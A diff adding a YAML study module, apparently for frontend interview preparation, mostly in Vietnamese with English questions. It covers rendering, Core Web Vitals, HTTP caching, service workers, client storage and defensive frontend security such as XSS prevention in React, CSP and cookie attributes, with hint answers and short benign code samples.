@@ -1,0 +1,845 @@
+id: 12-browser-web-perf
+slug: browser-web-perf
+title: Browser, Web Performance & Frontend Security
+tier: 3
+status: drafted
+summary: Critical rendering path, Core Web Vitals (LCP, INP, CLS), code splitting, HTTP caching, service worker, storage, XSS trong React, CSP, thay đổi third-party cookie.
+cvLinked: true
+prerequisites: []
+overview: |-
+  ## TL;DR
+
+  - Trình duyệt biến HTML/CSS/JS thành pixel qua **critical rendering path**: DOM + CSSOM → render tree → layout → paint → composite. CSS **render-blocking**, `<script>` thường **parser-blocking** → `defer`/`async`/`type="module"`.
+  - **Core Web Vitals** (đo ở **p75** dữ liệu thực tế của user): **LCP** ≤ 2.5s (tải), **INP** ≤ 200ms (phản hồi — thay **FID** từ 2024-03-12), **CLS** ≤ 0.1 (ổn định layout).
+  - Perf thực chiến = gửi **ít JS hơn** (code splitting, tree shaking), **cache đúng** (hashed asset `immutable`, HTML revalidate), ưu tiên tài nguyên quan trọng (preload/`fetchpriority`), không chặn main thread (long task > 50ms).
+  - Frontend security: React escape mặc định nhưng có lối thoát (`dangerouslySetInnerHTML`, URL `javascript:`, inject vào `<script>` khi SSR); **CSP** nonce/hash + Trusted Types là lớp thứ hai; token không để trong `localStorage` nếu có thể dùng cookie `HttpOnly`.
+  - Third-party cookies: Safari/Firefox chặn mặc định; Chrome **giữ** third-party cookie (bỏ kế hoạch deprecate, Privacy Sandbox APIs bị retire 2025) — nhưng vẫn thiết kế như thể không có (CHIPS, storage partitioning).
+
+  ## Khái niệm cốt lõi
+
+  | Khái niệm | Một câu | Ví dụ ngắn |
+  |---|---|---|
+  | Critical rendering path | Chuỗi bước từ byte → pixel | CSS lớn trong `<head>` làm trễ first paint |
+  | Render-blocking | Tài nguyên phải xong trước khi render | `<link rel="stylesheet">` |
+  | `defer` / `async` | defer: tải song song, chạy sau parse theo thứ tự; async: chạy ngay khi tải xong | analytics → `async`; app bundle → `defer` |
+  | LCP | Thời điểm phần tử nội dung lớn nhất trong viewport render xong | Ảnh hero sản phẩm |
+  | INP | Độ trễ tương tác (input → next paint) gần như tệ nhất trong phiên | Click "Add to cart" mất 450ms mới đổi UI |
+  | CLS | Tổng dịch chuyển layout bất ngờ (session window lớn nhất) | Banner cookie đẩy nội dung xuống |
+  | Long task | Task > 50ms trên main thread | JSON.parse 5MB, render list 10k row |
+  | Code splitting | Tách bundle, tải theo route/tính năng | `React.lazy(() => import('./Reports'))` |
+  | Cache-Control | Chỉ thị cache cho browser/CDN | `public, max-age=31536000, immutable` |
+  | ETag / 304 | Validator để revalidate rẻ | `If-None-Match: "abc"` → `304 Not Modified` |
+  | stale-while-revalidate | Trả bản cũ ngay, revalidate nền | `max-age=60, stale-while-revalidate=600` |
+  | Service worker | Proxy mạng chạy nền theo origin/scope | Offline, cache chiến lược, push |
+  | CSP | Header giới hạn nguồn script/style/... | `script-src 'nonce-r4nd' 'strict-dynamic'` |
+  | CHIPS | Cookie `Partitioned` theo top-level site | Widget chat nhúng |
+
+  ## Cơ chế hoạt động
+
+  ### Critical rendering path
+
+  ```mermaid
+  flowchart LR
+    H["HTML bytes"] --> P["Parse → DOM"]
+    P -- "gặp script thường" --> S["Tải + chạy JS<br/>(parser blocked)"]
+    S --> P
+    C["CSS"] --> CS["CSSOM"]
+    P --> RT["Render tree"]
+    CS --> RT
+    RT --> L["Layout<br/>(vị trí, kích thước)"]
+    L --> PT["Paint"]
+    PT --> CO["Composite (GPU layers)"]
+    CS -. "JS đọc style phải chờ CSSOM" .-> S
+  ```
+
+  ### Quyết định HTTP cache của browser
+
+  ```mermaid
+  flowchart TD
+    R["Request asset"] --> A{"Có trong cache?"}
+    A -- no --> N["Tải từ network"]
+    A -- yes --> F{"Còn fresh?<br/>(max-age / s-maxage)"}
+    F -- yes --> U["Dùng cache, không request"]
+    F -- no --> SWR{"Trong cửa sổ<br/>stale-while-revalidate?"}
+    SWR -- yes --> U2["Trả bản cũ ngay + revalidate nền"]
+    SWR -- no --> V["Revalidate: If-None-Match / If-Modified-Since"]
+    V -- "304" --> U3["Dùng lại body cache, cập nhật freshness"]
+    V -- "200" --> N2["Body mới"]
+  ```
+
+  ### Service worker lifecycle
+
+  ```mermaid
+  sequenceDiagram
+    participant Page
+    participant SW1 as SW v1 (active)
+    participant SW2 as SW v2 (new)
+    Page->>SW2: navigator.serviceWorker.register (script đổi byte)
+    SW2->>SW2: install (precache assets)
+    Note over SW2: waiting — v1 vẫn điều khiển các tab đang mở
+    SW2->>SW2: skipWaiting() (tuỳ chọn)
+    SW2->>SW2: activate (dọn cache cũ)
+    SW2->>Page: clients.claim() — điều khiển tab hiện tại
+    Page->>SW2: fetch events
+  ```
+
+  ## Trade-offs
+
+  | Chủ đề | Lựa chọn | Ưu | Nhược |
+  |---|---|---|---|
+  | Rendering | CSR SPA | Tương tác mượt sau khi tải, server đơn giản | LCP chậm, JS nhiều, SEO kém |
+  | | SSR / streaming (Next.js) | LCP nhanh, SEO | Hydration cost ảnh hưởng INP, server phức tạp |
+  | Code splitting | Theo route | Đơn giản, hiệu quả lớn | Chuyển route có độ trễ → prefetch |
+  | | Theo component | Chi tiết | Quá nhiều chunk nhỏ, waterfall |
+  | Lưu token | Cookie `HttpOnly; Secure; SameSite` | JS (XSS) không đọc được | Cần chống CSRF, cấu hình CORS/domain |
+  | | `localStorage` | Dễ | Bất kỳ XSS nào cũng đánh cắp được |
+  | Cache HTML | `no-cache` + ETag | Luôn mới, 304 rẻ | Một round-trip mỗi lần |
+  | | `max-age` dài | Nhanh | User kẹt ở version cũ, chunk 404 |
+  | SW strategy | Cache-first | Nhanh, offline | Stale nếu không version |
+  | | Network-first | Mới | Chậm khi mạng yếu |
+
+  ## Pitfalls
+
+  - `loading="lazy"` cho ảnh LCP; ảnh hero chèn bằng JS/CSS background → browser phát hiện muộn.
+  - Cache `index.html` lâu → sau deploy, HTML cũ trỏ chunk đã bị xoá → `ChunkLoadError`.
+  - Ảnh/iframe/ads không có kích thước → CLS; font swap đổi metric → CLS.
+  - Handler nặng đồng bộ trong `onChange`/`onClick` → INP tệ; `useMemo` khắp nơi không thay được việc bớt công việc.
+  - `dangerouslySetInnerHTML` với nội dung từ CMS/user không sanitize; `href={userUrl}` không kiểm scheme.
+  - CSP có `'unsafe-inline'` + `'unsafe-eval'` = gần như vô dụng chống XSS.
+  - Service worker cache-first cho HTML không có cơ chế update → user kẹt version cũ "mãi mãi".
+  - Đo perf chỉ bằng Lighthouse trên laptop mạnh (lab) thay vì RUM p75 trên thiết bị thật.
+
+  ## Cheat sheet
+
+  - Ngưỡng "good" (p75): LCP ≤ 2.5s · INP ≤ 200ms · CLS ≤ 0.1. "Poor": LCP > 4s · INP > 500ms · CLS > 0.25.
+  - LCP: SSR/HTML có sẵn ảnh, `<img fetchpriority="high">`, preload, CDN, nén ảnh (AVIF/WebP), không lazy-load.
+  - INP: chia nhỏ long task (`await` yield, `scheduler.yield()` nơi hỗ trợ), `startTransition`, virtualize list, bớt hydration, debounce.
+  - CLS: `width`/`height` hoặc `aspect-ratio`, reserve chỗ cho ads/banner, `font-display` + fallback metric, animation bằng `transform`.
+  - Cache: hashed assets `max-age=31536000, immutable`; HTML `no-cache` (+ ETag); API tuỳ dữ liệu; dữ liệu nhạy cảm `no-store` hoặc `private`.
+  - Script: app `defer`/module, third-party `async` hoặc tải sau tương tác; `preconnect` tới origin quan trọng.
+  - Security headers: CSP (nonce + `strict-dynamic`, `object-src 'none'`, `base-uri 'none'`, `frame-ancestors`), `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`.
+notionRefs:
+  - title: Progressive Web App
+    url: https://app.notion.com/p/3a5ef77f8ab2809e9abff9ad824432ef
+  - title: Browser SessionStorage
+    url: https://app.notion.com/p/3a6ef77f8ab280f9a21eca21c7f147a3
+references:
+  - title: web.dev — Web Vitals
+    url: https://web.dev/articles/vitals
+  - title: web.dev — Largest Contentful Paint (LCP)
+    url: https://web.dev/articles/lcp
+  - title: web.dev — Interaction to Next Paint (INP)
+    url: https://web.dev/articles/inp
+  - title: web.dev — Cumulative Layout Shift (CLS)
+    url: https://web.dev/articles/cls
+  - title: web.dev — Optimize long tasks
+    url: https://web.dev/articles/optimize-long-tasks
+  - title: MDN — Critical rendering path
+    url: https://developer.mozilla.org/en-US/docs/Web/Performance/Guides/Critical_rendering_path
+  - title: MDN — HTTP caching
+    url: https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Caching
+  - title: MDN — Cache-Control
+    url: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cache-Control
+  - title: MDN — Service Worker API
+    url: https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API
+  - title: MDN — Content Security Policy
+    url: https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP
+  - title: MDN — Storage quotas and eviction criteria
+    url: https://developer.mozilla.org/en-US/docs/Web/API/Storage_API/Storage_quotas_and_eviction_criteria
+  - title: MDN — Cookies Having Independent Partitioned State (CHIPS)
+    url: https://developer.mozilla.org/en-US/docs/Web/Privacy/Guides/Privacy_sandbox/Partitioned_cookies
+  - title: react.dev — dangerouslySetInnerHTML (common components)
+    url: https://react.dev/reference/react-dom/components/common
+  - title: OWASP — Cross Site Scripting Prevention Cheat Sheet
+    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+  - title: RFC 9111 — HTTP Caching
+    url: https://www.rfc-editor.org/rfc/rfc9111
+questions:
+  - id: browser-web-perf-001
+    level: easy
+    type: concept
+    q: Walk through the critical rendering path from receiving HTML to pixels on screen.
+    hint: |-
+      1. Parse HTML → **DOM** (tăng dần khi byte về).
+      2. Parse CSS → **CSSOM** (CSS render-blocking: không render khi CSSOM chưa xong).
+      3. DOM + CSSOM → **render tree** (chỉ node hiển thị).
+      4. **Layout**: tính vị trí/kích thước.
+      5. **Paint**: vẽ pixel vào layer. 6. **Composite**: ghép layer (GPU).
+      `<script>` không `defer/async` chặn parser; script cần CSSOM phải chờ CSS → CSS chậm gián tiếp chặn JS.
+    followUp: Which of these steps does changing `transform` skip compared to changing `width`?
+    tags: [rendering, crp]
+  - id: browser-web-perf-002
+    level: easy
+    type: concept
+    q: What are the Core Web Vitals today, what do they measure, and what are the "good" thresholds?
+    hint: |-
+      - **LCP** (Largest Contentful Paint): tốc độ tải nội dung chính — good ≤ 2.5s.
+      - **INP** (Interaction to Next Paint): độ phản hồi với tương tác trong cả phiên — good ≤ 200ms. **Thay FID** làm Core Web Vital từ **12/03/2024** (FID chỉ đo input delay của tương tác đầu tiên).
+      - **CLS** (Cumulative Layout Shift): ổn định layout — good ≤ 0.1.
+      Đánh giá ở **percentile 75** dữ liệu field (user thật), tách mobile/desktop.
+    followUp: Why was FID replaced — what did it fail to capture?
+    redFlags:
+      - "The Core Web Vitals are FCP, TTI and FID"
+    tags: [core-web-vitals, lcp, inp, cls]
+    verify: true
+  - id: browser-web-perf-003
+    level: easy
+    type: compare
+    q: Compare a plain `<script>`, `async`, `defer` and `type="module"`.
+    hint: |-
+      - Thường: dừng parse, tải + chạy ngay → chặn render.
+      - `async`: tải song song, **chạy ngay khi tải xong** (có thể giữa lúc parse), không đảm bảo thứ tự → script độc lập (analytics).
+      - `defer`: tải song song, chạy **sau khi parse xong**, trước `DOMContentLoaded`, **đúng thứ tự** → app bundle.
+      - `type="module"`: mặc định hành vi như `defer`; thêm `async` thì như async.
+      Inline script không có `src` thì `defer`/`async` không có tác dụng (trừ module + async).
+    followUp: Where does a third-party chat widget belong, and would you load it before or after user interaction?
+    tags: [scripts, crp]
+  - id: browser-web-perf-004
+    level: easy
+    type: gotcha
+    q: "What is the difference between `Cache-Control: no-cache`, `no-store`, `private` and `max-age=0`?"
+    hint: |-
+      - `no-cache`: **được lưu** nhưng phải **revalidate** với server trước mỗi lần dùng (ETag → 304 rẻ). Hay bị hiểu nhầm là "không cache".
+      - `no-store`: **không lưu** ở bất kỳ cache nào — cho dữ liệu nhạy cảm (số dư ngân hàng).
+      - `private`: chỉ browser cache của user, **không** cho shared cache (CDN/proxy) — response cá nhân hoá.
+      - `max-age=0`: hết hạn ngay → thường phải revalidate (khác nhỏ với `no-cache` về cách xử lý stale khi mất kết nối; kèm `must-revalidate` để chặt).
+    followUp: Which of these would you put on the HTML of a single-page app, and which on its hashed JS chunks?
+    redFlags:
+      - "no-cache means the browser never caches the response"
+    tags: [http-caching]
+  - id: browser-web-perf-005
+    level: easy
+    type: compare
+    q: Compare cookies, localStorage, sessionStorage, IndexedDB and the Cache API for client-side storage.
+    hint: |-
+      - **Cookie**: ~4KB, **gửi kèm mọi request** tới domain, có `HttpOnly` (JS không đọc), `Secure`, `SameSite`, expiry → session/auth.
+      - **localStorage**: ~5MB/origin, sync API (chặn main thread), bền, chia sẻ mọi tab cùng origin → preference.
+      - **sessionStorage**: như trên nhưng theo **tab**, mất khi đóng tab → state tạm của flow.
+      - **IndexedDB**: async, dữ liệu lớn có cấu trúc, index → offline data.
+      - **Cache API**: lưu cặp Request/Response, thường dùng từ service worker → offline asset.
+      Web Storage và IndexedDB đều đọc được bởi mọi script trên trang → không cho secret.
+    followUp: Why is `localStorage` a bad choice for large JSON blobs even below the quota?
+    tags: [storage]
+  - id: browser-web-perf-006
+    level: easy
+    type: concept
+    q: What is XSS, and what does React protect you from by default?
+    hint: |-
+      XSS: attacker chèn script chạy trong origin của bạn → đọc DOM, gọi API bằng session của user, đánh cắp token ở Web Storage.
+      Loại: stored (lưu trong DB), reflected (từ URL), DOM-based (JS client ghi input vào sink nguy hiểm).
+      React: giá trị nội suy trong JSX (`{userInput}`) được **escape** thành text; thuộc tính được set qua DOM API an toàn.
+      Không bảo vệ: `dangerouslySetInnerHTML`, URL `javascript:` trong `href` (React 19 chặn — xem câu sau), `ref.current.innerHTML`, `eval`, inject JSON vào `<script>` khi SSR, thư viện bên thứ ba thao tác DOM.
+    followUp: Name three ways to get XSS in a React app despite JSX escaping.
+    tags: [xss, react, security]
+  - id: browser-web-perf-007
+    level: easy
+    type: concept
+    q: What is code splitting and why does it improve performance?
+    hint: |-
+      Tách bundle JS thành nhiều chunk và chỉ tải chunk cần cho màn hình hiện tại (dynamic `import()`); bundler (webpack, Vite/Rollup, Turbopack) tạo chunk tự động.
+      Lợi ích: ít byte JS phải tải, **parse, compile, execute** lúc đầu → LCP/INP tốt hơn trên máy yếu (chi phí JS không chỉ là network).
+      Cách: route-level (`React.lazy` + `Suspense`, Next.js tự split theo route), component nặng (chart, editor, map), thư viện chỉ dùng khi tương tác.
+    example: |-
+      ```tsx
+      const ReportsPage = lazy(() => import('./pages/ReportsPage'));
+      <Suspense fallback={<PageSkeleton />}>
+        <ReportsPage />
+      </Suspense>
+      ```
+    followUp: What is a request waterfall in lazy loading and how do you avoid it?
+    tags: [code-splitting, bundle]
+  - id: browser-web-perf-008
+    level: easy
+    type: concept
+    q: What is a service worker and what can it do that normal page JavaScript cannot?
+    hint: |-
+      Script chạy nền, tách khỏi trang, theo **origin + scope**, chỉ trên **HTTPS** (hoặc localhost). Là **proxy mạng có thể lập trình**: chặn `fetch` của các trang trong scope và trả response từ cache/network.
+      Dùng cho: offline/PWA, chiến lược cache, background sync, push notification.
+      Không truy cập DOM, không có `localStorage` (dùng IndexedDB/Cache API), bị browser tắt khi idle → không giữ state trong biến global.
+    followUp: Why is a bug in a service worker more dangerous than a bug in a regular JS bundle?
+    tags: [service-worker, pwa]
+  - id: browser-web-perf-009
+    level: medium
+    type: concept
+    q: How do you diagnose and improve a poor LCP on a product detail page?
+    hint: |-
+      Tách LCP thành 4 phần (web.dev): **TTFB** → **resource load delay** (bao lâu browser mới phát hiện ảnh) → **resource load duration** → **element render delay**.
+      Fix theo phần:
+      - TTFB: cache HTML ở CDN/edge, SSR nhanh, tránh redirect.
+      - Load delay: ảnh LCP phải có trong HTML ban đầu (`<img>` thường, không phải CSS background/JS render), `fetchpriority="high"`, `<link rel="preload">` nếu cần; **không** `loading="lazy"`.
+      - Duration: ảnh đúng kích thước (`srcset`/`sizes`), AVIF/WebP, CDN.
+      - Render delay: CSS/JS chặn render, font, hydration chặn hiển thị.
+    followUp: The LCP element is a text block, not an image. What typically delays it?
+    tags: [lcp, images]
+  - id: browser-web-perf-010
+    level: medium
+    type: concept
+    q: What does INP measure exactly, and what are the three phases of an interaction's latency?
+    hint: |-
+      INP quan sát (gần như) mọi click/tap/keypress trong phiên và báo giá trị gần tệ nhất (bỏ outlier khi có nhiều tương tác). Không tính scroll/hover.
+      Ba phần:
+      1. **Input delay**: main thread đang bận (long task khác, hydration) nên handler chưa chạy được.
+      2. **Processing time**: thời gian chạy event handler (setState, tính toán, re-render đồng bộ).
+      3. **Presentation delay**: layout/paint để hiển thị frame kế tiếp (DOM lớn, style recalculation).
+      Đo: web-vitals library (attribution build) / RUM, Chrome DevTools Performance panel.
+    followUp: Which React features help reduce processing time for an expensive update?
+    tags: [inp, main-thread]
+  - id: browser-web-perf-011
+    level: medium
+    type: concept
+    q: What causes CLS in practice and how do you fix each cause?
+    hint: |-
+      - Ảnh/video/iframe không có kích thước → set `width`/`height` hoặc `aspect-ratio`.
+      - Ads/embed/banner chèn muộn (cookie consent, promo) → reserve chỗ (min-height), overlay thay vì đẩy nội dung.
+      - Web font swap đổi kích thước chữ → `font-display: optional`/`swap` + fallback font có metric tương tự (`size-adjust`), preload font.
+      - Nội dung chèn phía trên khi load dữ liệu → skeleton cùng kích thước.
+      - Animation `top/height` → dùng `transform`.
+      Shift xảy ra trong 500ms sau tương tác của user không tính.
+    followUp: Why can CLS in the field be much worse than what Lighthouse reports?
+    tags: [cls, layout]
+  - id: browser-web-perf-012
+    level: medium
+    type: concept
+    q: How do ETag and Last-Modified revalidation work, and what does a 304 save you?
+    hint: |-
+      Server gửi `ETag: "v5-abc"` và/hoặc `Last-Modified`. Khi bản cache hết fresh, browser gửi `If-None-Match: "v5-abc"` (hoặc `If-Modified-Since`). Không đổi → `304 Not Modified` **không body** → browser dùng lại body cache và cập nhật freshness.
+      Tiết kiệm băng thông và thời gian tải body — nhưng **vẫn tốn một round-trip** (latency). Để không có request nào: dùng `max-age` (với asset hashed).
+      Lưu ý: ETag khác nhau giữa các server sau load balancer (weak vs strong ETag, inode) làm giảm hit.
+    followUp: For an API returning a product list, would you use ETag, max-age, or both?
+    tags: [http-caching, etag]
+  - id: browser-web-perf-013
+    level: medium
+    type: design
+    q: Design the caching headers for an SPA — `index.html`, hashed JS/CSS chunks, images, and the JSON API.
+    hint: |-
+      - Hashed asset (`app.3f9a1c.js`): `Cache-Control: public, max-age=31536000, immutable` — tên đổi khi nội dung đổi.
+      - `index.html`: `no-cache` (+ ETag) → luôn revalidate để trỏ đúng chunk mới; CDN có thể cache ngắn + purge khi deploy.
+      - Ảnh nội dung (không hash): `max-age` vừa phải + `stale-while-revalidate`, hoặc hash trong URL qua image CDN.
+      - API: dữ liệu công khai ít đổi → `public, max-age=60, stale-while-revalidate=300` ở CDN; dữ liệu cá nhân → `private, no-cache`; dữ liệu nhạy cảm (banking) → `no-store`.
+      - Giữ chunk cũ trên CDN/storage vài ngày sau deploy để tab đang mở không bị 404.
+    followUp: Why should old chunks stay available after a deploy even with perfect headers?
+    tags: [http-caching, spa, design]
+  - id: browser-web-perf-014
+    level: medium
+    type: concept
+    q: "What does `stale-while-revalidate` do, and where is it actually honored?"
+    hint: |-
+      `Cache-Control: max-age=60, stale-while-revalidate=600`: trong 60s response là fresh; từ 60s tới 660s cache được **trả bản stale ngay** và **revalidate nền**; sau đó phải chờ network.
+      Hiệu quả: user gần như không chờ, dữ liệu cập nhật trong lần sau. Định nghĩa ở RFC 5861.
+      Hỗ trợ: phần lớn CDN và các browser hiện đại (mức hỗ trợ từng browser nên kiểm tra lại). Cùng ý tưởng ở tầng app: SWR/React Query, Next.js ISR.
+      Không hợp cho dữ liệu phải mới tuyệt đối (giá lúc checkout, số dư).
+    followUp: How is this different from `stale-if-error`?
+    tags: [http-caching, swr]
+    verify: true
+  - id: browser-web-perf-015
+    level: medium
+    type: debug
+    q: This scroll handler makes the page janky. What is wrong?
+    example: |-
+      ```ts
+      window.addEventListener('scroll', () => {
+        document.querySelectorAll('.card').forEach((card) => {
+          const h = card.offsetHeight;          // read layout
+          card.style.height = `${h + 1}px`;     // write layout
+        });
+      });
+      ```
+    hint: |-
+      **Layout thrashing** (forced synchronous layout): xen kẽ đọc (`offsetHeight`) và ghi style trong vòng lặp → mỗi lần đọc buộc browser tính lại layout cho thay đổi vừa ghi → O(n) layout mỗi scroll event.
+      Fix: gom **đọc hết rồi ghi hết**, chạy trong `requestAnimationFrame`, throttle; listener `{ passive: true }`; tránh đổi thuộc tính layout (dùng `transform`); `IntersectionObserver`/`ResizeObserver` thay vì đo khi scroll; CSS `content-visibility: auto` cho list dài.
+      DevTools Performance hiện cảnh báo "Forced reflow".
+    followUp: Which CSS properties can be animated without triggering layout or paint?
+    tags: [layout-thrashing, rendering, debug]
+  - id: browser-web-perf-016
+    level: medium
+    type: compare
+    q: Compare `preload`, `prefetch`, `preconnect` and `dns-prefetch`.
+    hint: |-
+      - `preload`: tải **ngay, ưu tiên cao** tài nguyên chắc chắn cần cho trang **hiện tại** mà browser phát hiện muộn (font, ảnh LCP trong CSS). Cần `as=`; preload không dùng trong vài giây → cảnh báo, lãng phí băng thông.
+      - `prefetch`: tải **ưu tiên thấp** tài nguyên có thể cần cho **điều hướng tiếp theo** (chunk route kế).
+      - `preconnect`: mở trước DNS + TCP + TLS tới origin quan trọng (CDN ảnh, API) — giới hạn vài origin.
+      - `dns-prefetch`: chỉ DNS, rẻ hơn, cho nhiều origin phụ.
+      Thêm: `fetchpriority="high|low"` điều chỉnh ưu tiên; Speculation Rules API (Chromium) để prefetch/prerender trang.
+    followUp: You preload five fonts and LCP got worse. Why?
+    tags: [resource-hints, loading]
+  - id: browser-web-perf-017
+    level: medium
+    type: concept
+    q: How do you implement route-level code splitting in a React SPA, including loading and error states?
+    hint: |-
+      `React.lazy(() => import('./Page'))` + `<Suspense fallback>` quanh route; **Error Boundary** để bắt chunk load fail (mạng, deploy mới) và cho retry/reload.
+      Prefetch chunk khi hover/idle (`import()` sớm) để chuyển route không chờ.
+      Tránh waterfall: route chunk không nên lại lazy-load component cần ngay; tải data song song với chunk (router loader / React Query prefetch).
+      Next.js App Router tự split theo route; `next/dynamic` cho component.
+    example: |-
+      ```tsx
+      const Transfers = lazy(() => import('./routes/Transfers'));
+      const prefetchTransfers = () => import('./routes/Transfers'); // gọi onMouseEnter
+
+      <ErrorBoundary fallback={<ChunkError onRetry={() => location.reload()} />}>
+        <Suspense fallback={<RouteSkeleton />}>
+          <Transfers />
+        </Suspense>
+      </ErrorBoundary>
+      ```
+    followUp: How would you retry a failed dynamic import once before showing the error UI?
+    tags: [code-splitting, react, suspense]
+  - id: browser-web-perf-018
+    level: medium
+    type: concept
+    q: How do you find out why a JavaScript bundle is large, and what are the usual fixes?
+    hint: |-
+      Công cụ: bundle analyzer (`webpack-bundle-analyzer`, `rollup-plugin-visualizer`, `@next/bundle-analyzer`), source-map-explorer, Coverage tab của DevTools (code không dùng lúc load).
+      Thủ phạm thường gặp: import cả thư viện (`lodash`, icon pack, `moment` + locales), polyfill thừa, duplicate version của cùng package, thư viện chart/editor ở bundle chính, JSON/translation lớn inline.
+      Fix: import theo module (ESM để tree-shake; `sideEffects: false`), thay thư viện nhẹ hơn (date-fns/dayjs), dynamic import, dedupe dependency, target browser hiện đại (bớt transpile), **performance budget** trong CI.
+    followUp: Why does tree shaking fail for some libraries even with ES modules?
+    tags: [bundle, tree-shaking]
+  - id: browser-web-perf-019
+    level: medium
+    type: concept
+    q: What are the essentials of image optimization for an e-commerce listing page?
+    hint: |-
+      - Định dạng hiện đại AVIF/WebP (fallback qua `<picture>` hoặc image CDN content negotiation).
+      - Responsive: `srcset` + `sizes` → không tải ảnh 2000px cho ô 300px.
+      - `loading="lazy"` cho ảnh **dưới fold**, **không** cho ảnh LCP; `decoding="async"`.
+      - Luôn có `width`/`height` (chống CLS).
+      - Ảnh LCP: `fetchpriority="high"`.
+      - CDN resize/nén theo thiết bị; placeholder (blur/màu chủ đạo).
+      Next.js `next/image` tự làm nhiều việc này (cần hiểu cấu hình `sizes`, `priority`/preload).
+    followUp: What is wrong with `sizes="100vw"` on a 4-column product grid?
+    tags: [images, lcp, cls]
+  - id: browser-web-perf-020
+    level: medium
+    type: compare
+    q: Compare service worker caching strategies — cache-first, network-first, stale-while-revalidate — and how updates reach users.
+    hint: |-
+      - **Cache-first**: asset tĩnh có version (precache lúc install) → nhanh, offline.
+      - **Network-first** (timeout fallback cache): HTML, API cần mới.
+      - **Stale-while-revalidate**: trả cache, cập nhật nền → avatar, ảnh sản phẩm, dữ liệu ít nhạy cảm.
+      Update: browser kiểm tra SW script khi navigate vào scope (script chính mặc định bỏ qua HTTP cache — `updateViaCache: 'imports'`); byte khác → install v2 → **waiting** tới khi mọi tab dùng v1 đóng, trừ khi `skipWaiting()`. `skipWaiting` + asset cũ đang chạy trong tab → lẫn version → thường hiện "Có bản mới, tải lại?" rồi mới skip.
+      Dùng Workbox thay vì tự viết.
+    followUp: How do you ship an emergency fix to users stuck on a broken service worker?
+    tags: [service-worker, caching, pwa]
+    verify: true
+  - id: browser-web-perf-021
+    level: medium
+    type: concept
+    q: Explain a strict Content Security Policy based on nonces or hashes. Why is an allowlist of domains weak?
+    hint: |-
+      Allowlist (`script-src 'self' cdn.example.com`) dễ bị bypass: domain được phép host JSONP/thư viện cũ (Angular cũ), open redirect, CDN chung chứa script của người khác.
+      Strict CSP: `script-src 'nonce-{random mỗi response}' 'strict-dynamic'; object-src 'none'; base-uri 'none'` → chỉ script có nonce đúng chạy; `strict-dynamic` cho phép script đó load script con. Trang tĩnh dùng **hash** của inline script.
+      Bổ sung: `frame-ancestors` (chống clickjacking), `report-to`/`report-uri`, rollout bằng `Content-Security-Policy-Report-Only`.
+      Next.js: nonce qua middleware/proxy → buộc render động (mất static).
+    example: |-
+      ```http
+      Content-Security-Policy: script-src 'nonce-7f3kQ9' 'strict-dynamic' https: 'unsafe-inline';
+        object-src 'none'; base-uri 'none'; frame-ancestors 'none'; report-to csp
+      ```
+      (`https:` và `'unsafe-inline'` chỉ là fallback cho browser cũ; browser hỗ trợ nonce/strict-dynamic sẽ bỏ qua chúng.)
+    followUp: What breaks when you enable a strict CSP on an app with inline event handlers like `onclick="..."`?
+    tags: [csp, xss, security]
+  - id: browser-web-perf-022
+    level: medium
+    type: concept
+    q: Explain the cookie attributes HttpOnly, Secure, SameSite (Strict/Lax/None), Domain/Path, and Partitioned.
+    hint: |-
+      - `HttpOnly`: JS không đọc được (`document.cookie`) → giảm hậu quả XSS (vẫn gửi request thay user được).
+      - `Secure`: chỉ gửi qua HTTPS. `__Host-` prefix: bắt buộc Secure, Path=/, không Domain → khó bị subdomain ghi đè.
+      - `SameSite=Strict`: không gửi với request cross-site; `Lax`: gửi với top-level navigation GET (chống phần lớn CSRF); `None`: luôn gửi (bắt buộc `Secure`) — cho embed/cross-site. Chrome coi thiếu SameSite là `Lax`.
+      - `Domain`/`Path`: phạm vi; set `Domain=example.com` → mọi subdomain nhận (rủi ro trong multi-tenant subdomain!).
+      - `Partitioned` (CHIPS): cookie third-party được tách theo top-level site.
+    followUp: In a multi-tenant app on `*.shop.com` subdomains, why is `Domain=shop.com` on the session cookie dangerous?
+    tags: [cookies, security, csrf]
+    verify: true
+  - id: browser-web-perf-023
+    level: medium
+    type: compare
+    q: Where should a SPA keep its access token — localStorage, memory, or an HttpOnly cookie? Defend your choice.
+    hint: |-
+      - `localStorage`: sống qua reload, dễ; **mọi XSS đọc được** và gửi đi → token bị đánh cắp dùng từ máy khác.
+      - **Memory** (biến JS) + refresh token trong cookie `HttpOnly`: XSS không lấy được refresh token; mất khi reload → gọi silent refresh.
+      - **Cookie `HttpOnly; Secure; SameSite`** + BFF (backend-for-frontend) giữ token phía server: tốt nhất cho app nhạy cảm (banking); cần chống CSRF (SameSite + CSRF token cho request thay đổi state), cần cùng site với API.
+      Lưu ý: XSS vẫn thực hiện request **nhân danh user** trong phiên đó dù không lấy được token → CSP và sanitize vẫn bắt buộc.
+    followUp: What does the BFF pattern change about CORS and CSRF?
+    tags: [auth, storage, security]
+  - id: browser-web-perf-024
+    level: medium
+    type: compare
+    q: Lab data (Lighthouse) vs field data (CrUX, RUM) — why do they disagree and which do you trust?
+    hint: |-
+      Lab: một lần chạy, thiết bị/mạng giả lập, không có tương tác thật → tốt để **debug và chặn regression** trong CI; **không đo được INP** thật (chỉ TBT làm proxy).
+      Field: user thật, thiết bị yếu, mạng thật, cache khác nhau, tương tác thật, p75 → là cái Google dùng và phản ánh trải nghiệm.
+      Lệch vì: cache ấm/lạnh, third-party theo vùng, A/B test, consent banner, thiết bị low-end, trang sau đăng nhập.
+      Tin field để đặt mục tiêu; dùng lab để tái hiện và sửa. Thu RUM bằng `web-vitals` gửi về analytics với attribution.
+    followUp: How would you set up RUM so you can tell which component caused a bad INP?
+    tags: [measurement, rum, lighthouse]
+  - id: browser-web-perf-025
+    level: medium
+    type: concept
+    q: How do web fonts affect performance and layout stability, and how do you load them well?
+    hint: |-
+      Font tải muộn → **FOIT** (chữ vô hình) hoặc **FOUT** (chữ fallback rồi đổi) → trễ LCP (nếu LCP là text) và CLS khi metric khác nhau.
+      Tốt:
+      - `font-display: swap` (hoặc `optional` để không bao giờ shift), fallback font chỉnh `size-adjust`/`ascent-override` cho giống.
+      - Self-host WOFF2, subset (Latin + Vietnamese cần range riêng), `preload` 1–2 font quan trọng nhất (có `crossorigin`).
